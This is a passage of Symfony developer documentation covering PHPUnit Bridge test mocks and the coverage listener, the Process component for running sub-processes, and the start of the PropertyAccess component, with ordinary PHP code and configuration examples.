    use App\Validator\DomainValidator;
    use PHPUnit\Framework\TestCase;

    class MyTest extends TestCase
    {
        public function testEmail(): void
        {
            $validator = new DomainValidator(['checkDnsRecord' => true]);
            $isValid = $validator->validate('example.com');

            // ...
        }
    }

In order to avoid making a real network connection, add the ``@group dns-sensitive``
annotation to the class and use the ``DnsMock::withMockedHosts()`` to configure
the data you expect to get for the given hosts::

    use App\Validator\DomainValidator;
    use PHPUnit\Framework\TestCase;
    use Symfony\Bridge\PhpUnit\DnsMock;

    /**
     * @group dns-sensitive
     */
    class DomainValidatorTest extends TestCase
    {
        public function testEmails(): void
        {
            DnsMock::withMockedHosts([
                'example.com' => [['type' => 'A', 'ip' => '1.2.3.4']],
            ]);

            $validator = new DomainValidator(['checkDnsRecord' => true]);
            $isValid = $validator->validate('example.com');

            // ...
        }
    }

The ``withMockedHosts()`` method configuration is defined as an array. The keys
are the mocked hosts and the values are arrays of DNS records in the same format
returned by :phpfunction:`dns_get_record`, so you can simulate diverse network
conditions::

    DnsMock::withMockedHosts([
        'example.com' => [
            [
                'type' => 'A',
                'ip' => '1.2.3.4',
            ],
            [
                'type' => 'AAAA',
                'ipv6' => '::12',
            ],
        ],
    ]);

Class Existence Based Tests
---------------------------

Tests that behave differently depending on existing classes, for example Composer's
development dependencies, are often hard to test for the alternate case. For that
reason, this component also provides mocks for these PHP functions:

* :phpfunction:`class_exists`
* :phpfunction:`interface_exists`
* :phpfunction:`trait_exists`
* :phpfunction:`enum_exists`

Use Case
~~~~~~~~

Consider the following example that relies on the ``Vendor\DependencyClass`` to
toggle a behavior::

    use Vendor\DependencyClass;

    class MyClass
    {
        public function hello(): string
        {
            if (class_exists(DependencyClass::class)) {
                return 'The dependency behavior.';
            }

            return 'The default behavior.';
        }
    }

A regular test case for ``MyClass`` (assuming the development dependencies
are installed during tests) would look like::

    use MyClass;
    use PHPUnit\Framework\TestCase;

    class MyClassTest extends TestCase
    {
        public function testHello(): void
        {
            $class = new MyClass();
            $result = $class->hello(); // "The dependency behavior."

            // ...
        }
    }

In order to test the default behavior instead use the
``ClassExistsMock::withMockedClasses()`` to configure the expected
classes, interfaces and/or traits for the code to run::

    use MyClass;
    use PHPUnit\Framework\TestCase;
    use Vendor\DependencyClass;

    class MyClassTest extends TestCase
    {
        // ...

        public function testHelloDefault(): void
        {
            ClassExistsMock::register(MyClass::class);
            ClassExistsMock::withMockedClasses([DependencyClass::class => false]);

            $class = new MyClass();
            $result = $class->hello(); // "The default behavior."

            // ...
        }
    }

Note that mocking a class with ``ClassExistsMock::withMockedClasses()``
will make :phpfunction:`class_exists`, :phpfunction:`interface_exists`
and :phpfunction:`trait_exists` return true.

To register an enumeration and mock :phpfunction:`enum_exists`,
``ClassExistsMock::withMockedEnums()`` must be used. Note that, like in
PHP 8.1 and later, calling ``class_exists`` on a enum will return ``true``.
That's why calling ``ClassExistsMock::withMockedEnums()`` will also register the enum
as a mocked class.

Troubleshooting
---------------

The ``@group time-sensitive`` and ``@group dns-sensitive`` annotations work
"by convention" and assume that the namespace of the tested class can be
obtained just by removing the ``Tests\`` part from the test namespace. I.e.
if your test cases fully-qualified class name (FQCN) is
``App\Tests\Watch\DummyWatchTest``, it assumes the tested class namespace
is ``App\Watch``.

If this convention doesn't work for your application, configure the mocked
namespaces in the ``phpunit.xml`` file, as done for example in the
:doc:`HttpKernel Component </components/http_kernel>`:

.. code-block:: xml

    <!-- https://phpunit.de/manual/4.1/en/appendixes.configuration.html -->
    <phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:noNamespaceSchemaLocation="https://schema.phpunit.de/4.1/phpunit.xsd"
    >

        <!-- ... -->

        <listeners>
            <listener class="Symfony\Bridge\PhpUnit\SymfonyTestsListener">
                <arguments>
                    <array>
                        <element key="time-sensitive"><string>Symfony\Component\HttpFoundation</string></element>
                    </array>
                </arguments>
            </listener>
        </listeners>
    </phpunit>

Under the hood, a PHPUnit listener injects the mocked functions in the tested
classes' namespace. In order to work as expected, the listener has to run before
the tested class ever runs.

By default, the mocked functions are created when the annotation are found and
the corresponding tests are run. Depending on how your tests are constructed,
this might be too late.

You can either:

* Declare the namespaces of the tested classes in your ``phpunit.xml.dist``;
* Register the namespaces at the end of the ``config/bootstrap.php`` file.

.. code-block:: xml

    <!-- phpunit.xml.dist -->
    <!-- ... -->
    <listeners>
        <listener class="Symfony\Bridge\PhpUnit\SymfonyTestsListener">
                <arguments>
                    <array>
                        <element key="time-sensitive"><string>Acme\MyClassTest</string></element>
                    </array>
                </arguments>
            </listener>
    </listeners>

::

    // config/bootstrap.php
    use Symfony\Bridge\PhpUnit\ClockMock;

    // ...
    if ('test' === $_SERVER['APP_ENV']) {
        ClockMock::register('Acme\\MyClassTest\\');
    }

Modified PHPUnit script
-----------------------

This bridge provides a modified version of PHPUnit that you can call by using
its ``bin/simple-phpunit`` command. It has the following features:

* Works with a standalone vendor directory that doesn't conflict with yours;
* Does not embed ``prophecy`` to prevent any conflicts with its dependencies;
* Collects and replays skipped tests when the ``SYMFONY_PHPUNIT_SKIPPED_TESTS``
  env var is defined: the env var should specify a file name that will be used for
  storing skipped tests on a first run, and replay them on the second run;
* Parallelizes test suites execution when given a directory as argument, scanning
  this directory for ``phpunit.xml.dist`` files up to ``SYMFONY_PHPUNIT_MAX_DEPTH``
  levels (specified as an env var, defaults to ``3``);

The script writes the modified PHPUnit it builds in a directory that can be
configured by the ``SYMFONY_PHPUNIT_DIR`` env var, or in the same directory as
the ``simple-phpunit`` if it is not provided. It's also possible to set this
env var in the ``phpunit.xml.dist`` file.

If you have installed the bridge through Composer, you can run it by calling e.g.:

.. code-block:: terminal

    $ vendor/bin/simple-phpunit

.. tip::

    It's possible to change the PHPUnit version by setting the
    ``SYMFONY_PHPUNIT_VERSION`` env var in the ``phpunit.xml.dist`` file (e.g.
    ``<server name="SYMFONY_PHPUNIT_VERSION" value="5.5"/>``). This is the
    preferred method as it can be committed to your version control repository.

    It's also possible to set ``SYMFONY_PHPUNIT_VERSION`` as a real env var
    (not defined in a :ref:`dotenv file <config-dot-env>`).

    In the same way, ``SYMFONY_MAX_PHPUNIT_VERSION`` will set the maximum version
    of PHPUnit to be considered. This is useful when testing a framework that does
    not support the latest version(s) of PHPUnit.

.. tip::

    If you still need to use ``prophecy`` (but not ``symfony/yaml``),
    then set the ``SYMFONY_PHPUNIT_REMOVE`` env var to ``symfony/yaml``.

    It's also possible to set this env var in the ``phpunit.xml.dist`` file.

.. tip::

    It is also possible to require additional packages that will be installed along
    with the rest of the needed PHPUnit packages using the ``SYMFONY_PHPUNIT_REQUIRE``
    env variable. This is specially useful for installing PHPUnit plugins without
    having to add them to your main ``composer.json`` file. The required packages
    need to be separated with a space.

    .. code-block:: xml

        <!-- phpunit.xml.dist -->
        <!-- ... -->
        <php>
            <env name="SYMFONY_PHPUNIT_REQUIRE" value="vendor/name:^1.2 vendor/name2:^3"/>
        </php>

Code Coverage Listener
----------------------

By default, the code coverage is computed with the following rule: if a line of
code is executed, then it is marked as covered. The test which executes a
line of code is therefore marked as "covering the line of code". This can be
misleading.

Consider the following example::

    class Bar
    {
        public function barMethod(): string
        {
            return 'bar';
        }
    }

    class Foo
    {
        public function __construct(
            private Bar $bar,
        ) {
        }

        public function fooMethod(): string
        {
            $this->bar->barMethod();

            return 'bar';
        }
    }

    class FooTest extends PHPUnit\Framework\TestCase
    {
        public function test(): void
        {
            $bar = new Bar();
            $foo = new Foo($bar);

            $this->assertSame('bar', $foo->fooMethod());
        }
    }

The ``FooTest::test`` method executes every single line of code of both ``Foo``
and ``Bar`` classes, but ``Bar`` is not truly tested. The ``CoverageListener``
aims to fix this behavior by adding the appropriate `@covers`_ annotation on
each test class.

If a test class already defines the ``@covers`` annotation, this listener does
nothing. Otherwise, it tries to find the code related to the test by removing
the ``Test`` part of the classname: ``My\Namespace\Tests\FooTest`` ->
``My\Namespace\Foo``.

Installation
~~~~~~~~~~~~

Add the following configuration to the ``phpunit.xml.dist`` file:

.. code-block:: xml

    <!-- https://phpunit.de/manual/6.0/en/appendixes.configuration.html -->
    <phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:noNamespaceSchemaLocation="https://schema.phpunit.de/6.0/phpunit.xsd"
    >

        <!-- ... -->

        <listeners>
            <listener class="Symfony\Bridge\PhpUnit\CoverageListener"/>
        </listeners>
    </phpunit>

If the logic used to find the related code is too simple or doesn't work for
your application, you can use your own SUT (System Under Test) solver:

.. code-block:: xml

    <listeners>
        <listener class="Symfony\Bridge\PhpUnit\CoverageListener">
            <arguments>
                <string>My\Namespace\SutSolver::solve</string>
            </arguments>
        </listener>
    </listeners>

The ``My\Namespace\SutSolver::solve`` can be any PHP callable and receives the
current test as its first argument.

Finally, the listener can also display warning messages when the SUT solver does
not find the SUT:

.. code-block:: xml

    <listeners>
        <listener class="Symfony\Bridge\PhpUnit\CoverageListener">
            <arguments>
                <null/>
                <boolean>true</boolean>
            </arguments>
        </listener>
    </listeners>

.. _`PHPUnit`: https://phpunit.de
.. _`PHPUnit event listener`: https://docs.phpunit.de/en/10.0/extending-phpunit.html#phpunit-s-event-system
.. _`ErrorHandler component`: https://github.com/symfony/error-handler
.. _`PHPUnit's assertStringMatchesFormat()`: https://docs.phpunit.de/en/9.6/assertions.html#assertstringmatchesformat
.. _`PHP error handler`: https://www.php.net/manual/en/book.errorfunc.php
.. _`environment variable`: https://docs.phpunit.de/en/9.6/configuration.html#the-env-element
.. _`@-silencing operator`: https://www.php.net/manual/en/language.operators.errorcontrol.php
.. _`Travis CI`: https://travis-ci.org/
.. _`test listener`: https://docs.phpunit.de/en/9.6/configuration.html#the-extensions-element
.. _`@covers`: https://docs.phpunit.de/en/9.6/annotations.html#covers
.. _`PHP namespace resolutions rules`: https://www.php.net/manual/en/language.namespaces.rules.php
The Process Component
=====================

    The Process component executes commands in sub-processes.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/process

.. include:: /components/require_autoload.rst.inc

Usage
-----

The :class:`Symfony\\Component\\Process\\Process` class executes a command in a
sub-process, taking care of the differences between operating system and
escaping arguments to prevent security issues. It replaces PHP functions like
:phpfunction:`exec`, :phpfunction:`passthru`, :phpfunction:`shell_exec` and
:phpfunction:`system`::

    use Symfony\Component\Process\Exception\ProcessFailedException;
    use Symfony\Component\Process\Process;

    $process = new Process(['ls', '-lsa']);
    $process->run();

    // executes after the command finishes
    if (!$process->isSuccessful()) {
        throw new ProcessFailedException($process);
    }

    echo $process->getOutput();

The ``getOutput()`` method always returns the whole content of the standard
output of the command and ``getErrorOutput()`` the content of the error
output. Alternatively, the :method:`Symfony\\Component\\Process\\Process::getIncrementalOutput`
and :method:`Symfony\\Component\\Process\\Process::getIncrementalErrorOutput`
methods return the new output since the last call.

The :method:`Symfony\\Component\\Process\\Process::clearOutput` method clears
the contents of the output and
:method:`Symfony\\Component\\Process\\Process::clearErrorOutput` clears
the contents of the error output.

You can also use the :class:`Symfony\\Component\\Process\\Process` class with the
for each construct to get the output while it is generated. By default, the loop waits
for new output before going to the next iteration::

    $process = new Process(['ls', '-lsa']);
    $process->start();

    foreach ($process as $type => $data) {
        if ($process::OUT === $type) {
            echo "\nRead from stdout: ".$data;
        } else { // $process::ERR === $type
            echo "\nRead from stderr: ".$data;
        }
    }

.. tip::

    The Process component internally uses a PHP iterator to get the output while
    it is generated. That iterator is exposed via the ``getIterator()`` method
    to allow customizing its behavior::

        $process = new Process(['ls', '-lsa']);
        $process->start();
        $iterator = $process->getIterator($process::ITER_SKIP_ERR | $process::ITER_KEEP_OUTPUT);
        foreach ($iterator as $data) {
            echo $data."\n";
        }

The ``mustRun()`` method is identical to ``run()``, except that it will throw
a :class:`Symfony\\Component\\Process\\Exception\\ProcessFailedException`
if the process couldn't be executed successfully (i.e. the process exited
with a non-zero code)::

    use Symfony\Component\Process\Exception\ProcessFailedException;
    use Symfony\Component\Process\Process;

    $process = new Process(['ls', '-lsa']);

    try {
        $process->mustRun();

        echo $process->getOutput();
    } catch (ProcessFailedException $exception) {
        echo $exception->getMessage();
    }

.. tip::

    You can get the last output time in seconds by using the
    :method:`Symfony\\Component\\Process\\Process::getLastOutputTime` method.
    This method returns ``null`` if the process wasn't started!

Configuring Process Options
---------------------------

Symfony uses the PHP :phpfunction:`proc_open` function to run the processes.
You can configure the options passed to the ``other_options`` argument of
``proc_open()`` using the ``setOptions()`` method::

    $process = new Process(['...', '...', '...']);
    // this option allows a subprocess to continue running after the main script exited
    $process->setOptions(['create_new_console' => true]);

.. caution::

    Most of the options defined by ``proc_open()`` (such as ``create_new_console``
    and ``suppress_errors``) are only supported on Windows operating systems.
    Check out the `PHP documentation for proc_open()`_ before using them.

Using Features From the OS Shell
--------------------------------

Using an array of arguments is the recommended way to define commands. This
saves you from any escaping and allows sending signals seamlessly
(e.g. to stop processes while they run)::

    $process = new Process(['/path/command', '--option', 'argument', 'etc.']);
    $process = new Process(['/path/to/php', '--define', 'memory_limit=1024M', '/path/to/script.php']);

If you need to use stream redirections, conditional execution, or any other
feature provided by the shell of your operating system, you can also define
commands as strings using the
:method:`Symfony\\Component\\Process\\Process::fromShellCommandline` static
factory.

Each operating system provides a different syntax for their command-lines,
so it becomes your responsibility to deal with escaping and portability.

When using strings to define commands, variable arguments are passed as
environment variables using the second argument of the ``run()``,
``mustRun()`` or ``start()`` methods. Referencing them is also OS-dependent::

    // On Unix-like OSes (Linux, macOS)
    $process = Process::fromShellCommandline('echo "$MESSAGE"');

    // On Windows
    $process = Process::fromShellCommandline('echo "!MESSAGE!"');

    // On both Unix-like and Windows
    $process->run(null, ['MESSAGE' => 'Something to output']);

If you prefer to create portable commands that are independent from the
operating system, you can write the above command as follows::

    // works the same on Windows , Linux and macOS
    $process = Process::fromShellCommandline('echo "${:MESSAGE}"');

Portable commands require using a syntax that is specific to the component: when
enclosing a variable name into ``"${:`` and ``}"`` exactly, the process object
will replace it with its escaped value, or will fail if the variable is not
found in the list of environment variables attached to the command.

Setting Environment Variables for Processes
-------------------------------------------

The constructor of the :class:`Symfony\\Component\\Process\\Process` class and
all of its methods related to executing processes (``run()``, ``mustRun()``,
``start()``, etc.) allow passing an array of environment variables to set while
running the process::

    $process = new Process(['...'], null, ['ENV_VAR_NAME' => 'value']);
    $process = Process::fromShellCommandline('...', null, ['ENV_VAR_NAME' => 'value']);
    $process->run(null, ['ENV_VAR_NAME' => 'value']);

In addition to the env vars passed explicitly, processes inherit all the env
vars defined in your system. You can prevent this by setting to ``false`` the
env vars you want to remove::

    $process = new Process(['...'], null, [
        'APP_ENV' => false,
        'SYMFONY_DOTENV_VARS' => false,
    ]);

Getting real-time Process Output
--------------------------------

When executing a long running command (like ``rsync`` to a remote
server), you can give feedback to the end user in real-time by passing an
anonymous function to the
:method:`Symfony\\Component\\Process\\Process::run` method::

    use Symfony\Component\Process\Process;

    $process = new Process(['ls', '-lsa']);
    $process->run(function ($type, $buffer): void {
        if (Process::ERR === $type) {
            echo 'ERR > '.$buffer;
        } else {
            echo 'OUT > '.$buffer;
        }
    });

.. note::

    This feature won't work as expected in servers using PHP output buffering.
    In those cases, either disable the `output_buffering`_ PHP option or use the
    :phpfunction:`ob_flush` PHP function to force sending the output buffer.

Running Processes Asynchronously
--------------------------------

You can also start the subprocess and then let it run asynchronously, retrieving
output and the status in your main process whenever you need it. Use the
:method:`Symfony\\Component\\Process\\Process::start` method to start an asynchronous
process, the :method:`Symfony\\Component\\Process\\Process::isRunning` method
to check if the process is done and the
:method:`Symfony\\Component\\Process\\Process::getOutput` method to get the output::

    $process = new Process(['ls', '-lsa']);
    $process->start();

    while ($process->isRunning()) {
        // waiting for process to finish
    }

    echo $process->getOutput();

You can also wait for a process to end if you started it asynchronously and
are done doing other stuff::

    $process = new Process(['ls', '-lsa']);
    $process->start();

    // ... do other things

    $process->wait();

    // ... do things after the process has finished

.. note::

    The :method:`Symfony\\Component\\Process\\Process::wait` method is blocking,
    which means that your code will halt at this line until the external
    process is completed.

.. note::

    If a ``Response`` is sent **before** a child process had a chance to complete,
    the server process will be killed (depending on your OS). It means that
    your task will be stopped right away. Running an asynchronous process
    is not the same as running a process that survives its parent process.

    If you want your process to survive the request/response cycle, you can
    take advantage of the ``kernel.terminate`` event, and run your command
    **synchronously** inside this event. Be aware that ``kernel.terminate``
    is called only if you use PHP-FPM.

.. danger::

    Beware also that if you do that, the said PHP-FPM process will not be
    available to serve any new request until the subprocess is finished. This
    means you can quickly block your FPM pool if you're not careful enough.
    That is why it's generally way better not to do any fancy things even
    after the request is sent, but to use a job queue instead.

:method:`Symfony\\Component\\Process\\Process::wait` takes one optional argument:
a callback that is called repeatedly whilst the process is still running, passing
in the output and its type::

    $process = new Process(['ls', '-lsa']);
    $process->start();

    $process->wait(function ($type, $buffer): void {
        if (Process::ERR === $type) {
            echo 'ERR > '.$buffer;
        } else {
            echo 'OUT > '.$buffer;
        }
    });

Instead of waiting until the process has finished, you can use the
:method:`Symfony\\Component\\Process\\Process::waitUntil` method to keep or stop
waiting based on some PHP logic. The following example starts a long running
process and checks its output to wait until its fully initialized::

    $process = new Process(['/usr/bin/php', 'slow-starting-server.php']);
    $process->start();

    // ... do other things

    // waits until the given anonymous function returns true
    $process->waitUntil(function ($type, $output): bool {
        return $output === 'Ready. Waiting for commands...';
    });

    // ... do things after the process is ready

Streaming to the Standard Input of a Process
--------------------------------------------

Before a process is started, you can specify its standard input using either the
:method:`Symfony\\Component\\Process\\Process::setInput` method or the 4th argument
of the constructor. The provided input can be a string, a stream resource or a
``Traversable`` object::

    $process = new Process(['cat']);
    $process->setInput('foobar');
    $process->run();

When this input is fully written to the subprocess standard input, the corresponding
pipe is closed.

In order to write to a subprocess standard input while it is running, the component
provides the :class:`Symfony\\Component\\Process\\InputStream` class::

    $input = new InputStream();
    $input->write('foo');

    $process = new Process(['cat']);
    $process->setInput($input);
    $process->start();

    // ... read process output or do other things

    $input->write('bar');
    $input->close();

    $process->wait();

    // will echo: foobar
    echo $process->getOutput();

The :method:`Symfony\\Component\\Process\\InputStream::write` method accepts scalars,
stream resources or ``Traversable`` objects as arguments. As shown in the above example,
you need to explicitly call the :method:`Symfony\\Component\\Process\\InputStream::close`
method when you are done writing to the standard input of the subprocess.

Using PHP Streams as the Standard Input of a Process
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The input of a process can also be defined using `PHP streams`_::

    $stream = fopen('php://temporary', 'w+');

    $process = new Process(['cat']);
    $process->setInput($stream);
    $process->start();

    fwrite($stream, 'foo');

    // ... read process output or do other things

    fwrite($stream, 'bar');
    fclose($stream);

    $process->wait();

    // will echo: 'foobar'
    echo $process->getOutput();

Using TTY and PTY Modes
-----------------------

All examples above show that your program has control over the input of a
process (using ``setInput()``) and the output from that process (using
``getOutput()``). The Process component has two special modes that tweak
the relationship between your program and the process: teletype (tty) and
pseudo-teletype (pty).

In TTY mode, you connect the input and output of the process to the input
and output of your program. This allows for instance to open an editor like
Vim or Nano as a process. You enable TTY mode by calling
:method:`Symfony\\Component\\Process\\Process::setTty`::

    $process = new Process(['vim']);
    $process->setTty(true);
    $process->run();

    // As the output is connected to the terminal, it is no longer possible
    // to read or modify the output from the process!
    dump($process->getOutput()); // null

In PTY mode, your program behaves as a terminal for the process instead of
a plain input and output. Some programs behave differently when
interacting with a real terminal instead of another program. For instance,
some programs prompt for a password when talking with a terminal. Use
:method:`Symfony\\Component\\Process\\Process::setPty` to enable this
mode.

Stopping a Process
------------------

Any asynchronous process can be stopped at any time with the
:method:`Symfony\\Component\\Process\\Process::stop` method. This method takes
two arguments: a timeout and a signal. Once the timeout is reached, the signal
is sent to the running process. The default signal sent to a process is ``SIGKILL``.
Please read the :ref:`signal documentation below <reference-process-signal>`
to find out more about signal handling in the Process component::

    $process = new Process(['ls', '-lsa']);
    $process->start();

    // ... do other things

    $process->stop(3, SIGINT);

Executing PHP Code in Isolation
-------------------------------

If you want to execute some PHP code in isolation, use the ``PhpProcess``
instead::

    use Symfony\Component\Process\PhpProcess;

    $process = new PhpProcess(<<<EOF
        <?= 'Hello World' ?>
    EOF
    );
    $process->run();

Executing a PHP Child Process with the Same Configuration
---------------------------------------------------------

When you start a PHP process, it uses the default configuration defined in
your ``php.ini`` file. You can bypass these options with the ``-d`` command line
option. For example, if ``memory_limit`` is set to ``256M``, you can disable this
memory limit when running some command like this:
``php -d memory_limit=-1 bin/console app:my-command``.

However, if you run the command via the Symfony ``Process`` class, PHP will use
the settings defined in the ``php.ini`` file. You can solve this issue by using
the :class:`Symfony\\Component\\Process\\PhpSubprocess` class to run the command::

    use Symfony\Component\Process\Process;

    class MyCommand extends Command
    {
        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            // the memory_limit (and any other config option) of this command is
            // the one defined in php.ini instead of the new values (optionally)
            // passed via the '-d' command option
            $childProcess = new Process(['bin/console', 'cache:pool:prune']);

            // the memory_limit (and any other config option) of this command takes
            // into account the values (optionally) passed via the '-d' command option
            $childProcess = new PhpSubprocess(['bin/console', 'cache:pool:prune']);
        }
    }

Process Timeout
---------------

By default processes have a timeout of 60 seconds, but you can change it passing
a different timeout (in seconds) to the ``setTimeout()`` method::

    use Symfony\Component\Process\Process;

    $process = new Process(['ls', '-lsa']);
    $process->setTimeout(3600);
    $process->run();

If the timeout is reached, a
:class:`Symfony\\Component\\Process\\Exception\\ProcessTimedOutException` is thrown.

For long running commands, it is your responsibility to perform the timeout
check regularly::

    $process->setTimeout(3600);
    $process->start();

    while ($condition) {
        // ...

        // check if the timeout is reached
        $process->checkTimeout();

        usleep(200000);
    }

.. tip::

    You can get the process start time using the ``getStartTime()`` method.

.. _reference-process-signal:

Process Idle Timeout
--------------------

In contrast to the timeout of the previous paragraph, the idle timeout only
considers the time since the last output was produced by the process::

    use Symfony\Component\Process\Process;

    $process = new Process(['something-with-variable-runtime']);
    $process->setTimeout(3600);
    $process->setIdleTimeout(60);
    $process->run();

In the case above, a process is considered timed out, when either the total runtime
exceeds 3600 seconds, or the process does not produce any output for 60 seconds.

Process Signals
---------------

When running a program asynchronously, you can send it POSIX signals with the
:method:`Symfony\\Component\\Process\\Process::signal` method::

    use Symfony\Component\Process\Process;

    $process = new Process(['find', '/', '-name', 'rabbit']);
    $process->start();

    // will send a SIGKILL to the process
    $process->signal(SIGKILL);

You can make the process ignore signals by using the
:method:`Symfony\\Component\\Process\\Process::setIgnoredSignals`
method. The given signals won't be propagated to the child process::

    use Symfony\Component\Process\Process;

    $process = new Process(['find', '/', '-name', 'rabbit']);
    $process->setIgnoredSignals([SIGKILL, SIGUSR1]);

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\Process\\Process::setIgnoredSignals`
    method was introduced in Symfony 7.1.

Process Pid
-----------

You can access the `pid`_ of a running process with the
:method:`Symfony\\Component\\Process\\Process::getPid` method::

    use Symfony\Component\Process\Process;

    $process = new Process(['/usr/bin/php', 'worker.php']);
    $process->start();

    $pid = $process->getPid();

Disabling Output
----------------

As standard output and error output are always fetched from the underlying process,
it might be convenient to disable output in some cases to save memory.
Use :method:`Symfony\\Component\\Process\\Process::disableOutput` and
:method:`Symfony\\Component\\Process\\Process::enableOutput` to toggle this feature::

    use Symfony\Component\Process\Process;

    $process = new Process(['/usr/bin/php', 'worker.php']);
    $process->disableOutput();
    $process->run();

.. caution::

    You cannot enable or disable the output while the process is running.

    If you disable the output, you cannot access ``getOutput()``,
    ``getIncrementalOutput()``, ``getErrorOutput()``, ``getIncrementalErrorOutput()`` or
    ``setIdleTimeout()``.

    However, it is possible to pass a callback to the ``start``, ``run`` or ``mustRun``
    methods to handle process output in a streaming fashion.

Finding an Executable
---------------------

The Process component provides a utility class called
:class:`Symfony\\Component\\Process\\ExecutableFinder` which finds
and returns the absolute path of an executable::

    use Symfony\Component\Process\ExecutableFinder;

    $executableFinder = new ExecutableFinder();
    $chromedriverPath = $executableFinder->find('chromedriver');
    // $chromedriverPath = '/usr/local/bin/chromedriver' (the result will be different on your computer)

The :method:`Symfony\\Component\\Process\\ExecutableFinder::find` method also takes extra parameters to specify a default value
to return and extra directories where to look for the executable::

    use Symfony\Component\Process\ExecutableFinder;

    $executableFinder = new ExecutableFinder();
    $chromedriverPath = $executableFinder->find('chromedriver', '/path/to/chromedriver', ['local-bin/']);

Finding the Executable PHP Binary
---------------------------------

This component also provides a special utility class called
:class:`Symfony\\Component\\Process\\PhpExecutableFinder` which returns the
absolute path of the executable PHP binary available on your server::

    use Symfony\Component\Process\PhpExecutableFinder;

    $phpBinaryFinder = new PhpExecutableFinder();
    $phpBinaryPath = $phpBinaryFinder->find();
    // $phpBinaryPath = '/usr/local/bin/php' (the result will be different on your computer)

Checking for TTY Support
------------------------

Another utility provided by this component is a method called
:method:`Symfony\\Component\\Process\\Process::isTtySupported` which returns
whether `TTY`_ is supported on the current operating system::

    use Symfony\Component\Process\Process;

    $process = (new Process())->setTty(Process::isTtySupported());

.. _`pid`: https://en.wikipedia.org/wiki/Process_identifier
.. _`PHP streams`: https://www.php.net/manual/en/book.stream.php
.. _`output_buffering`: https://www.php.net/manual/en/outcontrol.configuration.php
.. _`TTY`: https://en.wikipedia.org/wiki/Tty_(unix)
.. _`PHP documentation for proc_open()`: https://www.php.net/manual/en/function.proc-open.php
The PropertyAccess Component
============================

    The PropertyAccess component provides functions to read and write from/to an
    object or array using a simple string notation.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/property-access

.. include:: /components/require_autoload.rst.inc

Usage
-----

The entry point of this component is the
:method:`Symfony\\Component\\PropertyAccess\\PropertyAccess::createPropertyAccessor`
factory. This factory will create a new instance of the
:class:`Symfony\\Component\\PropertyAccess\\PropertyAccessor` class with the
default configuration::

    use Symfony\Component\PropertyAccess\PropertyAccess;

    $propertyAccessor = PropertyAccess::createPropertyAccessor();

Reading from Arrays
-------------------

You can read an array with the
:method:`Symfony\\Component\\PropertyAccess\\PropertyAccessor::getValue` method.
This is done using the index notation that is used in PHP::

    // ...
    $person = [
        'first_name' => 'Wouter',
    ];

    var_dump($propertyAccessor->getValue($person, '[first_name]')); // 'Wouter'
    var_dump($propertyAccessor->getValue($person, '[age]')); // null

As you can see, the method will return ``null`` if the index does not exist.
But you can change this behavior with the
:method:`Symfony\\Component\\PropertyAccess\\PropertyAccessorBuilder::enableExceptionOnInvalidIndex`
method::

    // ...
    $propertyAccessor = PropertyAccess::createPropertyAccessorBuilder()
        ->enableExceptionOnInvalidIndex()
        ->getPropertyAccessor();

    $person = [
        'first_name' => 'Wouter',
    ];

    // instead of returning null, the code now throws an exception of type
    // Symfony\Component\PropertyAccess\Exception\NoSuchIndexException
    $value = $propertyAccessor->getValue($person, '[age]');

    // You can avoid the exception by adding the nullsafe operator
    $value = $propertyAccessor->getValue($person, '[age?]');

You can also use multi dimensional arrays::

    // ...
    $persons = [
        [
            'first_name' => 'Wouter',
        ],
        [
            'first_name' => 'Ryan',
        ],
    ];

    var_dump($propertyAccessor->getValue($persons, '[0][first_name]')); // 'Wouter'
    var_dump($propertyAccessor->getValue($persons, '[1][first_name]')); // 'Ryan'

.. tip::

    If the key of the array contains a dot ``.`` or a left square bracket ``[``,
    you must escape those characters with a backslash. In the above example,
    if the array key was ``first.name`` instead of ``first_name``, you should
    access its value as follows::

        var_dump($propertyAccessor->getValue($persons, '[0][first\.name]')); // 'Wouter'
        var_dump($propertyAccessor->getValue($persons, '[1][first\.name]')); // 'Ryan'

    Right square brackets ``]`` don't need to be escaped in array keys.

Reading from Objects
--------------------

The ``getValue()`` method is a very robust method, and you can see all of its
features when working with objects.

Accessing public Properties
~~~~~~~~~~~~~~~~~~~~~~~~~~~

To read from properties, use the "dot" notation::

    // ...
    $person = new Person();
    $person->firstName = 'Wouter';

    var_dump($propertyAccessor->getValue($person, 'firstName')); // 'Wouter'

    $child = new Person();
    $child->firstName = 'Bar';
    $person->children = [$child];

    var_dump($propertyAccessor->getValue($person, 'children[0].firstName')); // 'Bar'

.. caution::

    Accessing public properties is the last option used by ``PropertyAccessor``.
    It tries to access the value using the below methods first before using
    the property directly. For example, if you have a public property that
    has a getter method, it will use the getter.

Using Getters
~~~~~~~~~~~~~

The ``getValue()`` method also supports reading using getters. The method will
be created using common naming conventions for getters. It transforms the
property name to camelCase (``first_name`` becomes ``FirstName``) and prefixes
it with ``get``. So the actual method becomes ``getFirstName()``::

    // ...
    class Person
    {
        private string $firstName = 'Wouter';

        public function getFirstName(): string
        {
            return $this->firstName;
        }
    }

    $person = new Person();

    var_dump($propertyAccessor->getValue($person, 'first_name')); // 'Wouter'

Using Hassers/Issers
~~~~~~~~~~~~~~~~~~~~

And it doesn't even stop there. If there is no getter found, the accessor will
look for an isser or hasser. This method is created using the same way as
getters, this means that you can do something like this::

    // ...
    class Person
    {
        private bool $author = true;
        private array $children = [];

        public function isAuthor(): bool
        {
            return $this->author;
        }

        public function hasChildren(): bool
        {
            return 0 !== count($this->children);
        }
    }

    $person = new Person();

    if ($propertyAccessor->getValue($person, 'author')) {
        var_dump('This person is an author');
    }
    if ($propertyAccessor->getValue($person, 'children')) {
        var_dump('This person has children');
    }

This will produce: ``This person is an author``

Accessing a non Existing Property Path
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default a :class:`Symfony\\Component\\PropertyAccess\\Exception\\NoSuchPropertyException`
is thrown if the property path passed to :method:`Symfony\\Component\\PropertyAccess\\PropertyAccessor::getValue`
does not exist. You can change this behavior using the
:method:`Symfony\\Component\\PropertyAccess\\PropertyAccessorBuilder::disableExceptionOnInvalidPropertyPath`
method::

    // ...
    class Person
    {
        public string $name;
    }

    $person = new Person();

    $propertyAccessor = PropertyAccess::createPropertyAccessorBuilder()
